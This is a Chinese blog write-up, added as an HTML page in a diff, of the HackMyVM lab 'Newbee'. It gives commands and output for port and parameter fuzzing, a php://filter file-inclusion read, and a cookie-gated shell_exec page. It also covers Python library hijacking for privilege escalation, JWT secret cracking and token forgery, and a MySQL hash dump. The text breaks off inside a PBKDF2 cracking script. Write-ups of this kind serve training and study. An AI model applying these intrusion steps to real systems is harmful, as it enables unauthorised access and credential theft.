@@ -1,0 +1,619 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/letter-k.svg">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/letter-k.svg">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"guayu-kakeru.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":"ture","show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="HMV-Newbee靶机复盘">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HMV-Newbee">
+<meta property="og:url" content="https://guayu-kakeru.github.io/posts/36480.html">
+<meta property="og:site_name" content="guayu-kakeru">
+<meta property="og:description" content="HMV-Newbee靶机复盘">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67e93f0c0ba3d5a1d7e6c9d6.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67e940a90ba3d5a1d7e6ca07.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67e944180ba3d5a1d7e6cb2d.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67e947100ba3d5a1d7e6cc90.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67e947ed0ba3d5a1d7e6ccfd.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67e948420ba3d5a1d7e6cd19.png">
+<meta property="article:published_time" content="2025-03-30T12:45:09.000Z">
+<meta property="article:modified_time" content="2025-03-30T14:10:30.379Z">
+<meta property="article:author" content="guayu-kakeru">
+<meta property="article:tag" content="渗透">
+<meta property="article:tag" content="HMV">
+<meta property="article:tag" content="靶场">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pic1.imgdb.cn/item/67e93f0c0ba3d5a1d7e6c9d6.png">
+
+<link rel="canonical" href="https://guayu-kakeru.github.io/posts/36480.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>HMV-Newbee | guayu-kakeru</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">guayu-kakeru</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">14</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">12</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">70</span></a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://guayu-kakeru.github.io/posts/36480.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="guayu-kakeru">
+      <meta itemprop="description" content="一年过后，你会希望从今天就开始行动。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="guayu-kakeru">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          HMV-Newbee
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2025-03-30 20:45:09 / 修改时间：22:10:30" itemprop="dateCreated datePublished" datetime="2025-03-30T20:45:09+08:00">2025-03-30</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E9%9D%B6%E5%9C%BA/" itemprop="url" rel="index"><span itemprop="name">靶场</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E9%9D%B6%E5%9C%BA/hmv/" itemprop="url" rel="index"><span itemprop="name">hmv</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+      
+        <div class="out-img-topic">
+          <img src="https://pic1.imgdb.cn/item/67e93e470ba3d5a1d7e6c9bc.png" class="img-topic">
+        </div>
+      
+      
+        <p>HMV-Newbee靶机复盘</p>
+<span id="more"></span>
+<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# nmap -p- 192.168.80.150</span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-30 20:50 CST</span><br><span class="line">Nmap scan report for bogon (192.168.80.150)</span><br><span class="line">Host is up (0.0016s latency).</span><br><span class="line">Not shown: 65533 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">22/tcp open  ssh</span><br><span class="line">80/tcp open  http</span><br><span class="line">MAC Address: 56:99:F1:13:6A:38 (Unknown)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 1.95 seconds</span><br></pre></td></tr></table></figure></div>
+<p>只有两个常见的端口 直接去web里面看</p>
+<h1 id="web探测"><a href="#web探测" class="headerlink" title="web探测"></a>web探测</h1><p>web这里是一个模板，有很多其他的模板，但是都是静态页面，没有有用的信息，也不能交互<br><img src="https://pic1.imgdb.cn/item/67e93f0c0ba3d5a1d7e6c9d6.png"><br>如果直接curl一下首页，发现有一个不同寻常的提示</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;/html&gt;</span><br><span class="line">&lt;!--Wrong paramter to GET--&gt; </span><br></pre></td></tr></table></figure></div>
+<p>这里要一个get参数，那就用fuzz扫一下</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# wfuzz -u http://192.168.80.150?FUZZ=id -w /usr/share/wordlists/wfuzz/general/common.txt --hw 1267</span><br><span class="line"> /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz&#x27;s documentation for more information.</span><br><span class="line">********************************************************</span><br><span class="line">* Wfuzz 3.1.0 - The Web Fuzzer                         *</span><br><span class="line">********************************************************</span><br><span class="line"></span><br><span class="line">Target: http://192.168.80.150?FUZZ=id/</span><br><span class="line">Total requests: 951</span><br><span class="line"></span><br><span class="line">=====================================================================</span><br><span class="line">ID           Response   Lines    Word       Chars       Payload                                           </span><br><span class="line">=====================================================================</span><br><span class="line"></span><br><span class="line">000000384:   200        376 L    1270 W     18863 Ch    &quot;hack&quot; </span><br></pre></td></tr></table></figure></div>
+<p>得到hack参数，现在用这个参数再curl一下，发现提示不一样了。</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;/html&gt;</span><br><span class="line">&lt;!-- include failed try another file --&gt;                             </span><br></pre></td></tr></table></figure></div>
+<p>这里说要include一个文件 尝试一下用php伪协议读一下文件也不能直接读出&#x2F;etc&#x2F;passwd，看来是要读取什么特定的文件<br>扫一下目录</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -u 192.168.80.150 -x php,txt,jpg,js</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.6</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://192.168.80.150</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.6</span><br><span class="line">[+] Extensions:              php,txt,jpg,js</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/.php                 (Status: 403) [Size: 279]</span><br><span class="line">/index.php            (Status: 200) [Size: 18852]</span><br><span class="line">/contact.php          (Status: 200) [Size: 8853]</span><br><span class="line">/about.php            (Status: 200) [Size: 10036]</span><br><span class="line">/products.php         (Status: 200) [Size: 12163]</span><br><span class="line">/blog.php             (Status: 200) [Size: 9782]</span><br><span class="line">/terms.php            (Status: 200) [Size: 6670]</span><br><span class="line">/assets               (Status: 301) [Size: 317] [--&gt; http://192.168.80.150/assets/]</span><br><span class="line">/testimonials.php     (Status: 200) [Size: 7907]</span><br><span class="line">/javascript           (Status: 301) [Size: 321] [--&gt; http://192.168.80.150/javascript/]</span><br><span class="line">/checkout.php         (Status: 200) [Size: 13307]</span><br><span class="line">/secret.php           (Status: 200) [Size: 2187]</span><br></pre></td></tr></table></figure></div>
+<p>不一样的是这个secret.php<br><img src="https://pic1.imgdb.cn/item/67e940a90ba3d5a1d7e6ca07.png"><br>这是一个虚拟的终端命令行，但是提示需要管理员权限，现在再去主页里面看看能不能读出这个文件的源代码<br>然后base64解码看到secret界面的逻辑</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# curl 192.168.80.150/?hack=php://filter/read=convert.base64-encode/resource=secret.php </span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">        if (isset($_COOKIE[&#x27;AreYouAdmin&#x27;]) &amp;&amp; $_COOKIE[&#x27;AreYouAdmin&#x27;] === &#x27;Yes&#x27;) &#123;</span><br><span class="line"></span><br><span class="line">            if (isset($_GET[&#x27;command&#x27;])) &#123;</span><br><span class="line">                $command = $_GET[&#x27;command&#x27;];</span><br><span class="line">                $output = shell_exec($command);</span><br><span class="line">                echo &#x27;&lt;div&gt;\&gt; &#x27; . htmlspecialchars($command) . &#x27;&lt;/div&gt;&#x27;;</span><br><span class="line">                echo &#x27;&lt;div&gt;&#x27; . nl2br(htmlspecialchars($output)) . &#x27;&lt;/div&gt;&#x27;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            echo &#x27;&lt;div&gt;No permission to execute commands, lacking admin permission.&lt;/div&gt;&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">        ?&gt;</span><br></pre></td></tr></table></figure></div>
+<p>这里的验证逻辑是有没有Cookie 的 AreYouAdmin 如果有就可以执行命令<br>用bp发包然后反弹shell拿到shell<br><img src="https://pic1.imgdb.cn/item/67e944180ba3d5a1d7e6cb2d.png"></p>
+<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>www用户可以用debian用户执行一个python文件，现在直接用python库劫持就可以得到debian用户的shell</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">www-data@Newbee:/var/www/html$ echo &quot;import os; os.system(&#x27;/bin/bash&#x27;)&quot; &gt; random.py</span><br><span class="line">www-data@Newbee:/var/www/html$ sudo -u debian /usr/bin/python3 /var/www/html/vuln.py</span><br><span class="line">sudo: unable to resolve host Newbee: Name or service not known</span><br><span class="line">debian@Newbee:/var/www/html$</span><br></pre></td></tr></table></figure></div>
+
+<p>debian用户没有sudo</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">debian@Newbee:~$ ls -al</span><br><span class="line">total 60</span><br><span class="line">drwx------ 5 debian debian 4096 Mar 25 06:24 .</span><br><span class="line">drwxr-xr-x 4 root   root   4096 Jul 11  2023 ..</span><br><span class="line">-rw-r--r-- 1 root   root      0 Mar  7 00:10 .bash_history</span><br><span class="line">-rw-r--r-- 1 debian debian  220 Mar  7 00:10 .bash_logout</span><br><span class="line">-rw-r--r-- 1 debian debian 3526 Jul 11  2023 .bashrc</span><br><span class="line">drwx------ 3 debian debian 4096 Mar  6 21:40 .gnupg</span><br><span class="line">-rw------- 1 debian debian  119 Mar 25 06:24 .mysql_history</span><br><span class="line">-rw-r--r-- 1 debian debian  807 Jul 11  2023 .profile</span><br><span class="line">drwxr-xr-x 2 root   root   4096 Mar 25 08:02 .secret</span><br><span class="line">drwxr-xr-x 2 debian debian 4096 Mar  8 23:01 .ssh</span><br><span class="line">-rw------- 1 debian debian 9049 Mar  6 22:25 .viminfo</span><br><span class="line">-rw-r--r-- 1 root   root    151 Mar  6 21:25 config.php</span><br><span class="line">-rw-r--r-- 1 root   root    120 Mar  6 21:26 note.txt</span><br><span class="line">-rw-r--r-- 1 debian debian   33 Mar  6 21:45 user.txt</span><br></pre></td></tr></table></figure></div>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">debian@Newbee:~$ cat note.txt </span><br><span class="line">Damn it, I forgot my database password. I heard that Debian is currently building a message board, maybe he can help me</span><br></pre></td></tr></table></figure></div>
+<p>提示是数据库密码</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">debian@Newbee:~$ cd .secret/</span><br><span class="line">debian@Newbee:~/.secret$ ls</span><br><span class="line">hint.txt  password.zip</span><br><span class="line">debian@Newbee:~/.secret$ cat hint.txt </span><br><span class="line">password is md5(key)</span><br><span class="line"></span><br><span class="line">and key is in mysql!!!!!!</span><br></pre></td></tr></table></figure></div>
+<p>进入secret之后还有一个提示，密码是数据库里面的 md5 这个密码可以用来解开zip文件<br>发现有一个5000端口开放了</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">debian@Newbee:~/.secret$ ss -lntup</span><br><span class="line">Netid      State       Recv-Q      Send-Q           Local Address:Port           Peer Address:Port     Process     </span><br><span class="line">udp        UNCONN      0           0                      0.0.0.0:68                  0.0.0.0:*                    </span><br><span class="line">tcp        LISTEN      0           128                  127.0.0.1:5000                0.0.0.0:*                    </span><br><span class="line">tcp        LISTEN      0           128                    0.0.0.0:22                  0.0.0.0:*                    </span><br><span class="line">tcp        LISTEN      0           80                   127.0.0.1:3306                0.0.0.0:*                    </span><br><span class="line">tcp        LISTEN      0           511                          *:80                        *:*                    </span><br><span class="line">tcp        LISTEN      0           128                       [::]:22                     [::]:*</span><br></pre></td></tr></table></figure></div>
+<p>输入ps -ef查看现在的进程，可以发现下面这个信息</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root         561     549  0 07:49 ?        00:00:00 /bin/sh -c /usr/bin/python3 /var/www/html/flask/main.py</span><br><span class="line">root         565     561  0 07:49 ?        00:00:07 /usr/bin/python3 /var/www/html/flask/main.py</span><br></pre></td></tr></table></figure></div>
+<p>也就是开了一个flask服务，那现在把这个端口转发一下，然后去web里面看看</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">debian<span class="variable">@Newbee</span><span class="symbol">:~/</span>.secret<span class="variable">$ </span>socat <span class="title class_">TCP</span>-<span class="symbol">LISTEN:</span><span class="number">9999</span>,fork <span class="symbol">TCP4:</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="symbol">:</span><span class="number">5000</span> &amp;</span><br><span class="line">[<span class="number">1</span>] <span class="number">992</span></span><br></pre></td></tr></table></figure></div>
+<p><img src="https://pic1.imgdb.cn/item/67e947100ba3d5a1d7e6cc90.png"><br>输入任意的账号密码都能登录<br>用bp抓包之后发现这里有jwt的token，用john破解一下</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# echo &quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InNkZmEiLCJleHAiOjE3NDMzNDQ5ODR9.ROPsqvA8LkCdvHB0NTE5vSC0tDiw91aaCAAU9n0E5-E&quot; &gt; hash</span><br><span class="line">                                                                                                                   </span><br><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# john hash</span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 128/128 ASIMD 4x])</span><br><span class="line">Will run 4 OpenMP threads</span><br><span class="line">Proceeding with single, rules:Single</span><br><span class="line">Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status</span><br><span class="line">Almost done: Processing the remaining buffered candidate passwords, if any.</span><br><span class="line">Proceeding with wordlist:/usr/share/john/password.lst</span><br><span class="line">Proceeding with incremental:ASCII</span><br><span class="line">noob             (?)     </span><br><span class="line">1g 0:00:00:02 DONE 3/3 (2025-03-30 21:30) 0.4385g/s 3999Kp/s 3999Kc/s 3999KC/s tykya2..savolie1</span><br><span class="line">Use the &quot;--show&quot; option to display all of the cracked passwords reliably</span><br><span class="line">Session completed. </span><br></pre></td></tr></table></figure></div>
+<p>得到这个jwt的密码noob<br>然后去一个jwt在线网站看看这个jwt的信息是什么<br><img src="https://pic1.imgdb.cn/item/67e947ed0ba3d5a1d7e6ccfd.png"><br>那现在用密钥修改jwt的username改成admin<br><img src="https://pic1.imgdb.cn/item/67e948420ba3d5a1d7e6cd19.png"><br>成功看到数据密码<br>然后回到shell里面看数据库中的内容 依次输入</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -p</span><br><span class="line">show databases;</span><br><span class="line">use user;</span><br><span class="line">show tables;</span><br><span class="line">select * from user;</span><br></pre></td></tr></table></figure></div>
+<p>得到</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">+----+----------+--------------------------------------------------------------------------------------------------------------------------+----------------------------------+------------------+</span><br><span class="line">| id | username | passwd                                                                                                                   | salt                             | passwd_hash_algo |</span><br><span class="line">+----+----------+--------------------------------------------------------------------------------------------------------------------------+----------------------------------+------------------+</span><br><span class="line">|  1 | debian   | 2c082e3ff2ca15e3b24f815d70653f0dead09534495069dd140e19adb2d117266cc4b1de8daf55c7c4827a0a5ccf70c6f537ffc4ddc74db4865c41c0 | 8bf3e3452b78544f8bee9400d6936d34 | pbdf2$50500$60   |</span><br><span class="line">+----+----------+--------------------------------------------------------------------------------------------------------------------------+----------------------------------+------------------+</span><br><span class="line">1 row in set (0.064 sec)</span><br></pre></td></tr></table></figure></div>
+<p>然后可以让ai写一个脚本破解密码</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="comment"># 目标 PBKDF2 哈希信息</span></span><br><span class="line">salt = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;8bf3e3452b78544f8bee9400d6936d34&quot;</span>)  <span class="comment"># 提取的 salt</span></span><br><span class="line">hash_stored = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;2c082e3ff2ca15e3b24f815d70653f0dead09534495069dd140e19adb2d117266cc4b1de8daf55c7c4827a0a5ccf70c6f537ffc4ddc74db4865c41c0&quot;</span>)  <span class="comment"># 提取的 